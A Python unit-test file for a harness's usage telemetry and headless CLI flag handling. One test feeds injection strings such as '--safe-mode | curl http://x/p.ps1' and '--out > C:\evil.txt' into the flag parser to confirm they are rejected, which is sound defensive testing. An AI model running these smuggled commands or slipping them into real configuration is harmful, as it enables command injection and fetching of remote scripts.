"""Unit tests for the headless usage telemetry (``src/harness/usage.py``).

The module's contract is narrow and defensive: it must extract what it can from a
CLI envelope, and **never** raise — a measurement that can fail a wave is worse
than no measurement. Most of these tests are therefore about malformed input.
"""

from __future__ import annotations

import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from src.harness import usage


def test_approx_tokens():
    assert usage.approx_tokens("") == 0
    assert usage.approx_tokens(None) == 0
    assert usage.approx_tokens("x" * 400) == 100
    assert usage.approx_tokens("ab") == 1  # floored, never zero for real text


def test_usage_from_envelope_reads_both_key_spellings():
    snake = {"usage": {"input_tokens": 1, "cache_read_input_tokens": 2}}
    camel = {"usage": {"inputTokens": 1, "cacheReadInputTokens": 2}}
    assert usage.usage_from_envelope(snake) == usage.usage_from_envelope(camel)


def test_usage_from_a_verbatim_cursor_envelope():
    """The exact stdout of `cursor-agent -p --output-format json`, 2026-08-10.

    Verbatim on purpose: Cursor spells its cache fields `cacheReadTokens` /
    `cacheWriteTokens`, which nothing else in this file uses. A rename would
    otherwise silently zero the only telemetry the Cursor path has, and the
    numbers would still look plausible.
    """
    envelope = json.loads(
        '{"type":"result","subtype":"success","is_error":false,"duration_ms":9099,'
        '"duration_api_ms":9099,"result":"ok",'
        '"session_id":"1fcf1d99-fca7-4f72-85b5-b1d2f0c751d8",'
        '"request_id":"ae3dadb7-3a8a-4305-ab0f-c39ef1bdee02",'
        '"usage":{"inputTokens":13874,"outputTokens":29,'
        '"cacheReadTokens":5248,"cacheWriteTokens":0}}'
    )
    out = usage.usage_from_envelope(envelope, model="grok-4.5")
    assert out["input"] == 13874
    assert out["output"] == 29
    assert out["cache_read"] == 5248
    assert out["cache_creation"] == 0
    assert out["duration_ms"] == 9099

    # Cursor's inputTokens EXCLUDES cache reads, same as Claude's, so the shared
    # billed-input sum needs no per-CLI arithmetic.
    rolled = usage.rollup([{**out, "prompt_sent": 7}])
    assert rolled["input"] + rolled["cache_read"] == 19_122
    assert rolled["overhead"] == 19_122 - 7


def test_usage_from_envelope_survives_garbage():
    """Never raise: every field optional, anything unrecognised dropped."""
    assert usage.usage_from_envelope(None) is None
    assert usage.usage_from_envelope("not a dict") is None
    assert usage.usage_from_envelope({}) is None
    assert usage.usage_from_envelope({"usage": "not a mapping"}) is None
    assert usage.usage_from_envelope({"usage": {}}) is None
    assert usage.usage_from_envelope({"usage": {"input_tokens": "many"}}) is None
    # Booleans are ints in Python; they are not token counts.
    assert usage.usage_from_envelope({"usage": {"input_tokens": True}}) is None
    # Partial data is still data.
    assert usage.usage_from_envelope({"usage": {"output_tokens": 7}}) == {"output": 7}


def test_side_calls_attribute_away_from_the_requested_model():
    envelope = {
        "usage": {"input_tokens": 1},
        "modelUsage": {
            "claude-sonnet-4-5-20250929": {"inputTokens": 100},
            "claude-haiku-4-5-20251001": {"inputTokens": 523, "outputTokens": 12},
            "junk": "not a mapping",
        },
    }
    out = usage.usage_from_envelope(envelope, model="sonnet")
    assert out["side_calls"] == {"claude-haiku-4-5-20251001": 535}
    # With no model to compare against, nothing can be called a side call... but
    # everything is still reported rather than silently dropped.
    out = usage.usage_from_envelope(envelope, model=None)
    assert set(out["side_calls"]) == {"claude-sonnet-4-5-20250929", "claude-haiku-4-5-20251001"}


def test_rollup_is_none_without_token_data():
    """Cursor waves and stub runners report nothing; say so rather than zero."""
    assert usage.rollup([]) is None
    assert usage.rollup([{"id": "a", "wall_s": 1.0, "prompt_sent": 50}]) is None


def test_rollup_totals_and_overhead_ratio():
    rows = [
        {"input": 10, "output": 20, "cache_creation": 5000, "cache_read": 3000,
         "prompt_sent": 1000, "cost_usd": 0.03},
        {"input": 10, "output": 20, "cache_creation": 0, "cache_read": 8000,
         "prompt_sent": 1000, "cost_usd": 0.01},
    ]
    out = usage.rollup(rows)
    assert out["jobs"] == 2
    assert out["cache_creation"] == 5000
    assert out["cache_read"] == 11_000
    billed = 20 + 5000 + 11_000
    assert out["overhead"] == billed - 2000
    assert out["overhead_ratio"] == round((billed - 2000) / billed, 3)
    assert out["cost_equiv_usd"] == 0.04


def test_rollup_never_reports_negative_overhead():
    """A prompt estimate that overshoots what was billed is not free money."""
    out = usage.rollup([{"input": 10, "cache_read": 0, "prompt_sent": 99_999}])
    assert out["overhead"] == 0
    assert out["overhead_ratio"] == 0.0


def test_append_and_read_usage_roundtrip(tmp_path: Path):
    log = tmp_path / "nested" / "usage.jsonl"
    for i in range(3):
        usage.append_usage(log, usage.job_record(
            job_id=f"c{i}", cli="claude", model="sonnet",
            prompt_sent=100, wall_s=1.5, rc=0, usage={"input": 5},
        ))
    rows = usage.read_recent(log)
    assert [r["id"] for r in rows] == ["c0", "c1", "c2"]
    assert rows[0]["input"] == 5


def test_append_usage_swallows_write_failures(tmp_path: Path):
    blocker = tmp_path / "file"
    blocker.write_text("x", encoding="utf-8")
    usage.append_usage(blocker / "usage.jsonl", {"id": "c0"})  # must not raise
    usage.append_usage(None, {"id": "c0"})
    # Unserializable payloads are dropped rather than raised.
    usage.append_usage(tmp_path / "u.jsonl", {"bad": object()})


def test_read_recent_skips_corrupt_lines(tmp_path: Path):
    log = tmp_path / "usage.jsonl"
    log.write_text('{"id": "a"}\nnot json\n\n["not a dict"]\n{"id": "b"}\n', encoding="utf-8")
    assert [r["id"] for r in usage.read_recent(log)] == ["a", "b"]
    assert usage.read_recent(tmp_path / "absent.jsonl") == []
    assert usage.read_recent(None) == []


def test_baseline_falls_back_until_enough_measurements(tmp_path: Path):
    log = tmp_path / "usage.jsonl"
    value, source = usage.baseline_tokens(log)
    assert value == usage.DEFAULT_BASELINE_TOKENS["claude"]
    assert source.startswith("default:")

    # Two rows is not yet enough to prefer measurement over the documented default.
    for _ in range(2):
        usage.append_usage(log, {"input": 0, "cache_creation": 9000, "cache_read": 0,
                                 "prompt_sent": 0, "rc": 0})
    assert usage.baseline_tokens(log)[1].startswith("default:")

    usage.append_usage(log, {"input": 0, "cache_creation": 9000, "cache_read": 0,
                             "prompt_sent": 0, "rc": 0})
    value, source = usage.baseline_tokens(log)
    assert value == 9000
    assert source.startswith("measured:")


def test_default_baseline_is_per_cli(tmp_path: Path):
    """~4.4x apart: one constant for both under-quoted every Cursor wave."""
    log = tmp_path / "usage.jsonl"
    claude_value, claude_src = usage.baseline_tokens(log, cli="claude")
    cursor_value, cursor_src = usage.baseline_tokens(log, cli="cursor")
    assert claude_value == 3900 and "2026-07-30" in claude_src
    assert cursor_value == 17_200 and "2026-08-10" in cursor_src
    # An un-threaded caller, or an unknown family, gets the claude number rather
    # than a crash — this function must never be what fails a wave.
    assert usage.baseline_tokens(log)[0] == 3900
    assert usage.baseline_tokens(log, cli="gemini")[0] == 3900
    assert usage.baseline_tokens(log, cli=None)[0] == 3900


def test_baseline_medians_only_the_requested_cli(tmp_path: Path):
    """One log holds every family's rows; a mixed median describes neither."""
    log = tmp_path / "usage.jsonl"
    for _ in range(4):
        usage.append_usage(log, {"cli": "claude", "input": 4000, "prompt_sent": 0, "rc": 0})
        usage.append_usage(log, {"cli": "cursor", "input": 18_000, "prompt_sent": 0, "rc": 0})

    assert usage.baseline_tokens(log, cli="claude")[0] == 4000
    assert usage.baseline_tokens(log, cli="cursor")[0] == 18_000
    # Unfiltered still medians the mixture — which is why callers thread cli.
    assert usage.baseline_tokens(log)[0] == 11_000
    # Provenance names the family it measured, so a quoted number is traceable.
    assert "cursor" in usage.baseline_tokens(log, cli="cursor")[1]


def test_baseline_ignores_rows_with_no_cli_when_filtering(tmp_path: Path):
    """Unknown provenance cannot calibrate a specific family."""
    log = tmp_path / "usage.jsonl"
    for _ in range(4):
        usage.append_usage(log, {"input": 9999, "prompt_sent": 0, "rc": 0})
    assert usage.baseline_tokens(log, cli="cursor")[0] == 17_200
    assert usage.baseline_tokens(log, cli="cursor")[1].startswith("default:")


def test_baseline_ignores_failed_jobs(tmp_path: Path):
    """A job that died before doing work is not evidence about per-job overhead."""
    log = tmp_path / "usage.jsonl"
    for _ in range(3):
        usage.append_usage(log, {"input": 0, "cache_creation": 7000, "cache_read": 0,
                                 "prompt_sent": 0, "rc": 0})
    for _ in range(5):
        usage.append_usage(log, {"input": 0, "cache_creation": 10, "cache_read": 0,
                                 "prompt_sent": 0, "rc": 1})
    assert usage.baseline_tokens(log)[0] == 7000


def test_job_record_shape():
    record = usage.job_record(
        job_id="c0", cli="claude", model="sonnet", prompt_sent=100,
        wall_s=1.234, rc=0, flags=["--strict-mcp-config"], warm=True,
        usage={"input": 5, "cache_read": 9}, error=None, effort="medium",
        cache="5m",
    )
    assert record["flags"] == ["--strict-mcp-config"]
    assert record["effort"] == "medium"
    assert record["cache"] == "5m"
    assert record["warm"] is True
    assert record["wall_s"] == 1.23
    assert record["input"] == 5 and record["cache_read"] == 9
    assert "error" not in record
    # Round-trips as one JSONL line.
    assert json.loads(json.dumps(record))["id"] == "c0"


def test_job_record_effort_none_on_cursor_profile():
    """Cursor waves record effort=None (the flag is Claude-only)."""
    record = usage.job_record(
        job_id="c0", cli="cursor", model="sonnet", prompt_sent=100,
        wall_s=1.0, rc=0, effort=None, cache=None,
    )
    assert record["effort"] is None
    assert record["cache"] is None


def test_rollup_surfaces_cache_mode():
    rows = [
        {"input": 10, "output": 20, "cache_creation": 5000, "cache_read": 3000,
         "prompt_sent": 1000, "cost_usd": 0.03, "cache": "5m"},
        {"input": 10, "output": 20, "cache_creation": 0, "cache_read": 8000,
         "prompt_sent": 1000, "cost_usd": 0.01, "cache": "5m"},
    ]
    out = usage.rollup(rows)
    assert out["cache"] == "5m"


def test_median_wall_s_from_usage_log(tmp_path: Path):
    log = tmp_path / "usage.jsonl"
    assert usage.median_wall_s(log) is None
    for wall in (100.0, 200.0, 300.0):
        usage.append_usage(log, {"rc": 0, "wall_s": wall})
    assert usage.median_wall_s(log) == 200.0
    # Failed jobs do not move the median.
    usage.append_usage(log, {"rc": 1, "wall_s": 999.0})
    assert usage.median_wall_s(log) == 200.0


def test_resolve_prompt_cache_precedence():
    from src.harness import state

    cfg = {"headless_prompt_cache": "1h"}
    assert state.resolve_prompt_cache(cfg, cache_override="off") == "off"
    assert state.resolve_prompt_cache(cfg) == "1h"
    assert state.resolve_prompt_cache({}) == "auto"
    assert state.resolve_prompt_cache({"headless_prompt_cache": "bogus"}) == "auto"


def test_headless_extra_flags_accepts_list_or_string():
    """`config-set --value` delivers a string; whitespace-split makes free text work."""
    from src.harness import state

    assert state.headless_extra_flags({"headless_extra_flags": ["--effort", "low"]}) == [
        "--effort", "low",
    ]
    assert state.headless_extra_flags({"headless_extra_flags": "--effort low"}) == [
        "--effort", "low",
    ]
    # Anything else runs today's argv rather than taking the wave down.
    assert state.headless_extra_flags({}) == []
    assert state.headless_extra_flags({"headless_extra_flags": None}) == []
    assert state.headless_extra_flags({"headless_extra_flags": 42}) == []
    assert state.headless_extra_flags({"headless_extra_flags": ["--ok", {"bad": 1}]}) == ["--ok"]


def test_extra_flags_are_quote_aware_and_keep_windows_paths():
    """`--setting-sources ""` is documented, so it must reach argv as an empty string."""
    from src.harness import state

    assert state.split_extra_flags('--setting-sources ""') == ["--setting-sources", ""]
    # POSIX-mode shlex would eat the backslashes and yield 'C:Usersxf.json'.
    assert state.split_extra_flags(r"--settings C:\Users\x\f.json") == [
        "--settings", r"C:\Users\x\f.json",
    ]
    assert state.headless_extra_flags(
        {"headless_extra_flags": '--strict-mcp-config --setting-sources ""'}
    ) == ["--strict-mcp-config", "--setting-sources", ""]
    # Unbalanced quotes must not take a wave down.
    assert state.headless_extra_flags({"headless_extra_flags": '--foo "unbalanced'}) == []


def test_extra_flags_drops_the_whole_value_when_a_token_is_unsafe():
    """config_set gates this loudly; a hand-edited config.json still must not inject.

    Dropping only the metacharacter would leave a mangled argv nobody asked for
    ('--safe-mode & echo hi' minus '&'), so the whole value is ignored and the
    wave runs on today's argv.
    """
    from src.harness import state

    assert state.unsafe_extra_flag_tokens(["--safe-mode", "&", "echo"]) == ["&"]
    assert state.unsafe_extra_flag_tokens(["--ok", "sonnet", ""]) == []
    assert state.unsafe_extra_flag_tokens(["--out=%PATH%"]) == ["--out=%PATH%"]
    assert state.unsafe_extra_flag_tokens(["---"]) == ["---"]

    for hostile in (
        "--safe-mode & echo pwned",
        "--safe-mode | curl http://x/p.ps1",
        "--out > C:\\evil.txt",
    ):
        assert state.headless_extra_flags({"headless_extra_flags": hostile}) == []
    # Same guard on the list form.
    assert state.headless_extra_flags(
        {"headless_extra_flags": ["--safe-mode", "&", "echo"]}
    ) == []
    # A safe value is untouched.
    assert state.headless_extra_flags(
        {"headless_extra_flags": "--strict-mcp-config --model sonnet"}
    ) == ["--strict-mcp-config", "--model", "sonnet"]


def test_trailing_bare_effort_is_dropped_not_passed_through():
    """A dangling --effort would end argv on a flag the CLI rejects, killing every job."""
    from src.harness import state

    argv, level, _ = state.resolve_headless_argv(
        {"headless_extra_flags": ["--strict-mcp-config", "--effort"]}, command="judges",
    )
    assert argv.count("--effort") == 1
    assert argv == ["--effort", level, "--strict-mcp-config"]


def test_resolve_headless_argv_precedence():
    """cli > this type's config key > per-command table; no duplicate --effort."""
    from src.harness import state

    cfg = {
        "headless_effort_judges": "high",
        "headless_extra_flags": ["--strict-mcp-config"],
    }
    # CLI override wins over the config key.
    argv, level, src = state.resolve_headless_argv(
        cfg, command="judges", effort_override="medium",
    )
    assert level == "medium" and src == "cli"
    assert argv == ["--effort", "medium", "--strict-mcp-config"]
    assert argv.count("--effort") == 1

    # Without a CLI override, the config key wins over the table.
    argv, level, src = state.resolve_headless_argv(cfg, command="judges")
    assert level == "high" and src == "config"
    assert argv == ["--effort", "high", "--strict-mcp-config"]
    assert argv.count("--effort") == 1


def test_resolve_headless_argv_auto_table():
    """auto → medium for judges/annotations, high for translate/footnotes."""
    from src.harness import state

    cfg = {"headless_extra_flags": []}
    for cmd, expected in (
        ("judges", "medium"),
        ("annotations", "medium"),
        ("translate", "high"),
        ("footnotes", "high"),
    ):
        argv, level, src = state.resolve_headless_argv(cfg, command=cmd)
        assert level == expected, cmd
        assert src == f"default:{cmd}"
        assert argv == ["--effort", expected]

    # The shipped DEFAULTS carry "auto" for every type and resolve identically.
    assert state.resolve_headless_argv(dict(state.DEFAULTS), command="translate")[1] == "high"


def test_resolve_headless_argv_keys_are_independent_per_type():
    """Pinning one wave type must never move another — the whole point of the split.

    A book that drops judges to `low` to make review cheap must not thereby drop
    the effort its actual book prose is translated at.
    """
    from src.harness import state

    types = tuple(state.COMMAND_EFFORT_DEFAULTS)
    base = {state.effort_config_key(cmd): "auto" for cmd in types}

    for pinned in types:
        cfg = dict(base)
        cfg[state.effort_config_key(pinned)] = "low"
        for cmd in types:
            _argv, level, src = state.resolve_headless_argv(cfg, command=cmd)
            if cmd == pinned:
                assert (level, src) == ("low", "config"), cmd
            else:
                assert level == state.COMMAND_EFFORT_DEFAULTS[cmd], (pinned, cmd)
                assert src == f"default:{cmd}", (pinned, cmd)


def test_resolve_headless_argv_default_emits_no_flag():
    """'default' (config or CLI) means emit no --effort, for that type only."""
    from src.harness import state

    argv, level, src = state.resolve_headless_argv(
        {"headless_effort_judges": "default"}, command="judges",
    )
    assert level is None and src == "config" and argv == []

    argv, level, src = state.resolve_headless_argv(
        {"headless_effort_judges": "medium"}, command="judges", effort_override="default",
    )
    assert level is None and src == "cli" and argv == []

    # Silencing translate leaves the other types on their defaults.
    cfg = {"headless_effort_translate": "default"}
    assert state.resolve_headless_argv(cfg, command="translate")[1] is None
    assert state.resolve_headless_argv(cfg, command="footnotes")[1] == "high"
    assert state.resolve_headless_argv(cfg, command="judges")[1] == "medium"


def test_resolve_headless_argv_discards_effort_in_extra_flags():
    """--effort has no business in headless_extra_flags: dropped, never honored.

    ``flow.config_set`` rejects it outright; this covers a hand-edited config.json
    that got past that gate. The per-type key must still decide, and argv must
    carry exactly one --effort pair.
    """
    from src.harness import state

    cfg = {
        "headless_effort_judges": "auto",
        "headless_extra_flags": ["--effort", "xhigh", "--strict-mcp-config"],
    }
    argv, level, src = state.resolve_headless_argv(cfg, command="judges")
    assert level == "medium" and src == "default:judges"
    assert argv == ["--effort", "medium", "--strict-mcp-config"]
    assert argv.count("--effort") == 1

    # Equals form is stripped too, and the type's own key still wins.
    cfg2 = {
        "headless_effort_translate": "low",
        "headless_extra_flags": ["--effort=xhigh"],
    }
    argv, level, src = state.resolve_headless_argv(cfg2, command="translate")
    assert level == "low" and src == "config"
    assert argv == ["--effort", "low"] and argv.count("--effort") == 1


def test_resolve_headless_argv_mistyped_config_falls_through():
    """A mistyped effort key must not take a wave down."""
    from src.harness import state

    argv, level, src = state.resolve_headless_argv(
        {"headless_effort_judges": "turbo"}, command="judges",
    )
    assert level == "medium" and src == "default:judges"
    assert argv == ["--effort", "medium"]

    # Same for a prose type, which falls through to its own high default.
    argv, level, src = state.resolve_headless_argv(
        {"headless_effort_translate": "turbo"}, command="translate",
    )
    assert level == "high" and src == "default:translate"
    assert argv == ["--effort", "high"]
